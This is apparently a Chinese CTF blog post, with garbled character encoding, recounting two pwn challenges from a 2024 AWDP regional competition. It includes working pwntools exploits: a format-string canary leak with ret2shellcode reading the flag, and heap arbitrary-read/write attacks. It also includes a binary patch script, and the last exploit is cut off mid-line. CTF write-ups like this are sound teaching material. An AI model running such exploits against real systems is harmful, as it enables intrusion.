    <content type="html"><![CDATA[<h1 id="2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°"><a href="#2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°" class="headerlink" title="2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°"></a>2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°</h1><p>ç¬¬ä¸€æ¬¡æ‰“å›½èµ›ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ‰“awdpï¼ˆéæ­£è§„ï¼‰ã€‚èµ›åå¹³å°ã€é¢˜ç›®éƒ½æ˜¯éé¢„æœŸã€‚ç«Ÿç„¶å¯ä»¥ç”¨fixæ¥breakï¼Œç®—æ˜¯é•¿è§è¯†äº†ã€‚è¿™æ¬¡æ¯”èµ›æ›´å¤šçš„æ˜¯ç§¯ç´¯ç»éªŒäº†ã€‚</p><p>8web 2pwnã€‚ä¸¤é“é¢˜éƒ½é€šäº†ï¼Œå¯æ˜¯éƒ½æ²¡fixæˆåŠŸã€‚</p><p>9.23è®¿é—®å¹³å°åœ°å€ï¼Œ9.30é¶æœºå¼€å§‹è®¿é—®</p><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h2><p>è¿™é¢˜è›®å¯æƒœçš„ï¼Œæ¼æ´å°±æ˜¯æ ˆæº¢å‡º+æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒèŠ±äº†40å¤šåˆ†é’Ÿæ‰“é€šã€‚ä¸€å¼€å§‹çœ‹åˆ°é¢˜ç›®å…ˆæƒ³ç€fixäº†ï¼Œæ²¡æœ‰å…ˆbreakã€‚ç»“æœpatchäº†6æ¬¡éƒ½æ²¡è¿‡ï¼Œåˆ°äº†10.45æ”¾å¼ƒfixè¿™é¢˜ï¼Œå¼€å§‹breakã€‚åˆ°13è½®å‡ºäº†ï¼Œæœ€ç»ˆåƒäº†3wå¤šåˆ†ã€‚å½“æ—¶åº”è¯¥å…ˆbreakå†fixçš„ï¼Œèƒ½å¤šåƒäº”å…­è½®åˆ†ï¼Œå¤§æ¦‚è¿˜èƒ½æ‹¿ä¸ƒå…«åƒåˆ†ã€‚</p><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>(<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556142.png" alt="111"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556611.png" alt="image-20240625153135803"></p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆåœ°å€ä»¥åŠcanaryï¼Œç”±äºæ²¡å¼€NXï¼Œæ ˆä¸Šå†™shellcodeï¼Œæ‰“ret2shellcode</p><p>shellcodeå†™orwï¼Œopenç”¨openatä»£æ›¿</p><p>å†™shellcodeçš„æ—¶å€™readä»æ–‡ä»¶æè¿°ç¬¦3é‡Œé¢è¯»äº†ï¼Œå¯¼è‡´æœ¬åœ°æˆåŠŸæ³„éœ²flagï¼Œè¿œç¨‹æ²¡æˆåŠŸæ³„éœ²ï¼ŒåˆèŠ±äº†å¥½å¤šæ—¶é—´æ’é™¤shellcodeçš„é—®é¢˜ï¼Œæœ€åä»raxé‡Œé¢è¯»ï¼Œå¤§æ¦‚èŠ±äº†ååˆ†é’Ÿï¼Œåˆæ˜¯ä¸€è½®åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1  --&gt; stackoverflow</span></span><br><span class="line"><span class="comment">#2  --&gt; fmt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu1</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;-&gt;set name\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu2</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;192.73.1.182 80&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    <span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%17$p--%18$p&#x27;</span>   <span class="comment">#-0x60 --&gt; shellcode</span></span><br><span class="line">    menu1(payload)</span><br><span class="line">    menu2()</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(r(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;   </span></span><br><span class="line"><span class="string">                    mov r14, 0x67616c66</span></span><br><span class="line"><span class="string">                    push r14</span></span><br><span class="line"><span class="string">                    mov rsi, rsp</span></span><br><span class="line"><span class="string">                    mov rdi, -100</span></span><br><span class="line"><span class="string">                    mov edx, 0</span></span><br><span class="line"><span class="string">                    mov rax, 257</span></span><br><span class="line"><span class="string">                    syscall               </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">                    mov rsi, rsp</span></span><br><span class="line"><span class="string">                    mov rdi, rax</span></span><br><span class="line"><span class="string">                    mov rdx, 0xff</span></span><br><span class="line"><span class="string">                    xor rax, rax</span></span><br><span class="line"><span class="string">                    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    mov rsi, rsp</span></span><br><span class="line"><span class="string">                    mov rdi, 1</span></span><br><span class="line"><span class="string">                    mov rax, 1</span></span><br><span class="line"><span class="string">                    syscall</span></span><br><span class="line"><span class="string">                    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0x0</span>) + p64(ori-<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug(&#x27;b *$rebase(0x0001474) \n \</span></span><br><span class="line">    <span class="comment">#       b *$rebase(0x0014A6)&#x27;)</span></span><br><span class="line">    <span class="comment"># debug(&#x27;b *$rebase(0x014D7  )&#x27;)</span></span><br><span class="line">    menu1(payload)</span><br><span class="line">    getflag()</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;canary&quot;</span>, canary)</span><br><span class="line">    leak(<span class="string">&quot;ori&quot;</span>, ori)</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>åœ¨10.45ä¹‹å‰fixäº†6æ¬¡ï¼Œä¸€ç›´æ²¡æˆåŠŸï¼Œæ ˆæº¢å‡ºæ”¹å­—èŠ‚ä¸º0x48æˆ–è€…0x28</p><p>æ”¹printfä¸ºputsã€æ·»åŠ â€œ%sâ€ï¼Œæ”¹printfè°ƒç”¨å‰çš„è·³è½¬ï¼Œéƒ½å°è¯•è¿‡äº†ï¼Œéƒ½æ²¡è¿‡checkã€‚å°¤å…¶æ˜¯æ”¹è·³è½¬ï¼Œè‡ªå·±éƒ½ä¸çŸ¥é“è¿˜èƒ½æ€ä¹ˆæ‰“äº†ï¼Œä¸€ç›´æ²¡checkè¿‡ã€‚ä¸æ’é™¤å¯¹æ–‡ä»¶å­—èŠ‚å¤§å°çš„check</p><p>patchè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">fmt_offset = awd_pwn_patcher.add_constant_in_ehframe(<span class="string">&quot;%s\x00\x00&quot;</span>)</span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">lea rax, [rbp-0x50]</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">lea rdi, qword ptr [&#123;&#125;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(fmt_offset))</span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x14AB</span>, jmp_to=<span class="number">0x14B7</span>, assembly=assembly)</span><br><span class="line">assembly = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx, 0x48</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">awd_pwn_patcher.patch_origin(<span class="number">0x0147D</span>, end=<span class="number">0x01482</span>, assembly=assembly)</span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€ç›´patchä¸è¿‡ï¼Œçœ‹äº†<a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>çš„wpï¼ŒåŸæ¥ç›´æ¥æ”¹æ ˆæƒé™å°±è¡Œäº†å—â€¦â€¦åƒäº†æ²¡ç»éªŒçš„äºäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251558233.png" alt="image-20240625154514962"></p><p>rwxæ”¹æˆrwå°±è¡Œäº†ï¼Œ7-&gt;6å³å¯ã€‚</p><p>ä¸»è¦æ˜¯å…‰æ”¹è¿™ä¸ªä¹Ÿèƒ½ç»•è¿‡å•Šâ€¦â€¦æ‰“ROPgadgetç­‰ç­‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œæº¢å‡ºéƒ½æ²¡æ”¹ï¼Œè¿˜æ˜¯èƒ½æ‰“çš„ã€‚è¿™å°±æ˜¯ä¸ç»™libcçš„æ­£ç¡®è§£æ³•å—â€¦â€¦</p><p>å®åœ¨ä¸æ‡‚æ€ä¹ˆcheckçš„ã€‚æ”¹äº†æº¢å‡ºã€åŠ äº†â€œ%sâ€ï¼Œæˆ‘è®¤ä¸ºå°±ç®—æ˜¯æ²¡æœ‰å¼€NXä¹Ÿæ‰“ä¸äº†çš„ï¼Œç»“æœè¿‡ä¸äº†checkâ€¦â€¦</p><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h2><p>é™æ€ é«˜ç‰ˆæœ¬ç¼–è¯‘</p><p>ä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡å¯¼å…¥ç¬¦å·è¡¨è¿˜åŸç¬¦å·çš„æ–¹æ³•ï¼Œæ¯”èµ›çš„æ—¶å€™è¾¹é€†è¾¹è°ƒï¼Œç¢°å·§é¢˜ç›®ä¸æ˜¯ç‰¹åˆ«éš¾ï¼Œç¡¬æ˜¯è°ƒå‡ºæ¥äº†ï¼Œç¨‹åºéƒ½æ²¡é€†å®Œã€‚å¯æƒœä¸€ç›´åœ¨å¼„pwn-1çš„patchï¼Œè¿™é¢˜åœ¨14.40å¤šbreakï¼Œæœ€ååªåƒäº†6kå¤šåˆ†</p><h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>é€†å‘</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251609873.png" alt="image-20240625160948822"></p><p>é€†çš„æ—¶å€™æ„Ÿè§‰chkflagå¾ˆå¥‡æ€ªï¼Œé‡Œé¢è²Œä¼¼æ˜¯ä½¿ç”¨äº†openè¯»å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612858.png" alt="image-20240625161209814"></p><p>è°ƒä¸€è°ƒå‘ç°è¯»å–flagåˆ°äº†å †ä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612341.png" alt="image-20240625161246286"></p><p>ç„¶ååˆ©ç”¨getflagçš„ä»»æ„åœ°å€è¯»èƒ½è¯»åˆ°idåœ°å€ä¸º0x4efaf0ä¸Šçš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251613318.png" alt="image-20240625161349274"></p><p>ä¸­é—´å¤šåŠ ä¸€æ­¥addflagæ¥æ³„éœ²å †åœ°å€ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°addflagå¾—åˆ°çš„ç¬¬ä¸€å—chunkåœ°å€å§‹ç»ˆä¸flagçš„åç§»ä¸º876</p><p>æœ€åç›´æ¥æ³„éœ²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openflag</span>():</span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./heap&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    <span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    add()</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    openflag()</span><br><span class="line">    getflag(ori + <span class="number">876</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system_addr, bin_sh = get_sysbin_local(&#x27;puts&#x27;, puts_addr)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ori = &quot;</span> + <span class="built_in">str</span>(ori))</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x00000000004020b2&#x27;)</span></span><br><span class="line">    itr()</span><br><span class="line"><span class="comment">#0x4ef784</span></span><br></pre></td></tr></table></figure><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>æ¼æ´å¤ªå¤šä¸çŸ¥é“ä¿®ä»€ä¹ˆäº†â€¦â€¦å¥½åƒè¿˜æ˜¯äººå·¥æµ‹ï¼Œå¤ªæ…¢äº†</p><p>å°è¯•äº†ä¸ªå°†flagæ”¹ä¸ºflaaï¼Œcheckè¿‡ä¸äº†ã€‚åŸæ¥ä¸æ­¢çœ‹èƒ½ä¸è¯»åˆ°flagå—</p><p>æœ€åæ˜¯æ²¡patchæˆåŠŸã€‚å¤ªèœäº†ã€‚ã€‚ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=178896319914142">Realè¿”ç’å½’çœŸ</a>è¿™ä½å¸ˆå‚…æ˜¯nopæ‰äº†åé—¨å‡½æ•°</p><p><a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>æ˜¯æ”¹äº†chkflagé‡Œé¢çš„å‚æ•°</p><p>è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚ã€‚ã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>å½“æ—¶æ²¡é€†å®Œçš„ç°åœ¨è¡¥è¡¥å§ã€‚</p><h4 id="æ¢å¤ç¬¦å·è¡¨"><a href="#æ¢å¤ç¬¦å·è¡¨" class="headerlink" title="æ¢å¤ç¬¦å·è¡¨"></a>æ¢å¤ç¬¦å·è¡¨</h4><p>å…ˆå°è¯•<strong>æ¢å¤é™æ€ç¼–è¯‘å»ç¬¦å·çš„åº“å‡½æ•°å</strong>ï¼Œé¢˜ç›®çš„ç¼–è¯‘ç¯å¢ƒä¸º22ï¼Œä¼°è®¡é¶æœºç¯å¢ƒæ˜¯2.34ä»¥ä¸Šã€‚</p><p><a href="(https://blog.csdn.net/Breeze_CAT/article/details/103788796)">IDA_flair</a>ç›´æ¥å¯¼å…¥å¯¹åº”çš„sigæ–‡ä»¶ï¼Œå¯¹åº”sigæ–‡ä»¶<a href="https://github.com/push0ebp/sig-database">push0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com)</a>ä¸‹è½½ï¼Œé‡Œé¢æœ€glibcæœ€é«˜ä¸º2.35ï¼Œå¦‚æœæ˜¯å†é«˜ç‚¹å°±éœ€éœ€è¦è‡ªå·±ç”Ÿæˆäº†ã€‚</p><p>å¯¼å…¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251713761.png" alt="image-20240625171320497"></p><h4 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h4><p>lsflagéå†ä¸€échunk</p><p>addflagå‡½æ•°ï¼Œä»é¢„åˆ†é…çš„0x191å¤§å°çš„chunkä¸­ï¼Œåˆ†å‰²å‡ºäº†12å­—èŠ‚ï¼Œå‰å››å­—èŠ‚å†™å…¥size8ï¼Œå8å­—èŠ‚ä¸ºdata</p><p>qword_4E82F0é‡Œé¢ä¿å­˜ç€chunkçš„åˆå§‹åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251714517.png" alt="image-20240625171441484"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251719512.png" alt="image-20240625171911393"></p><p>editflagå‡½æ•°</p><p>å¾€v4åœ°å€é‡Œé¢å†™å…¥v5ï¼Œä»»æ„åœ°å€å†™</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251723956.png" alt="image-20240625172322905"></p><p>delflagå‡½æ•°</p><p>å°†dataåŸŸç½®ç©º</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251724645.png" alt="image-20240625172418594"></p><p>getflagå‡½æ•°</p><p>è¾“å‡ºv8åœ°å€å†…çš„æ•°æ®ï¼Œv8å¯æ§ï¼Œä»»æ„åœ°å€è¯»</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251725678.png" alt="image-20240625172532626"></p><p>chkflagå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251726607.png" alt="image-20240625172616549"></p><p>è¯»å–flagå‰8å­—èŠ‚å–å‡ºï¼ŒåŒæ—¶ä¹Ÿä¼šåœ¨å †ä¸Šä¿å­˜flagâ€“&gt;éé¢„æœŸå­˜åœ¨åŸå› </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736037.png" alt="image-20240625173208267"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736505.png" alt="image-20240625173355406"></p><p>æ¥ä¸‹æ¥çš„sub_401D0Få°†å–å‡ºæ¥çš„8å­—èŠ‚flagä¿å­˜åœ¨0x4E60F0å¤„</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739695.png" alt="image-20240625173911635"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739567.png" alt="image-20240625173900469"></p><p>sub_401C51ï¼Œå°†flagä¿å­˜åœ¨äº†å †ä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251740443.png" alt="image-20240625174003363"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251744116.png" alt="image-20240625174209271"></p><p>ç„¶åæ˜¯å››æ¬¡çš„å¾ªç¯åŠ å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251747486.png" alt="image-20240625174702436"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251745788.png" alt="image-20240625174530752"></p><p>è¿‡äº†è¿™æ®µchkåä¼šæ‰“å°flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251746139.png" alt="image-20240625174644089"></p><p>å…ˆç”³è¯·å‡ºå››å—chunkç”¨äºå­˜æ”¾åŠ å¯†åçš„flagï¼Œç„¶åæ‰§è¡Œchkflagï¼Œå°†flagå†™å…¥åˆ°0x4E60F0å†…ï¼Œè¿™æ—¶ä½¿ç”¨getflagå–å‡º0x4E60F0ä¸­åŠ å¯†è¿‡åçš„flagã€‚å†å¾ªç¯å››æ¬¡ä½¿ç”¨editflagå¾€å››å—chunkä¸­å†™å…¥å››æ®µå¾ªç¯åŠ å¯†çš„flagï¼Œæœ€åæ‰§è¡Œchkflagå°±èƒ½æˆåŠŸçš„è¿‡checkï¼Œè¾“å‡ºflagã€‚</p><p>ä¸€ä¸ªå»äº†ç¬¦å·è¡¨çš„é€»è¾‘æ¼æ´â€¦â€¦æ´æœ‰ç‚¹å¤šï¼Œcheckçš„ç‚¹ä¹Ÿæ˜¯å¥‡å¥‡åˆæ€ªæ€ªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addflag</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editflag</span>(<span class="params">target, value</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(target) + <span class="built_in">str</span>(<span class="string">&#x27; &#x27;</span>) + <span class="built_in">str</span>(value))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chkflag</span>():</span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./heap&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    <span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add_4_chunk</span></span><br><span class="line">    addflag()</span><br><span class="line">    ru(<span 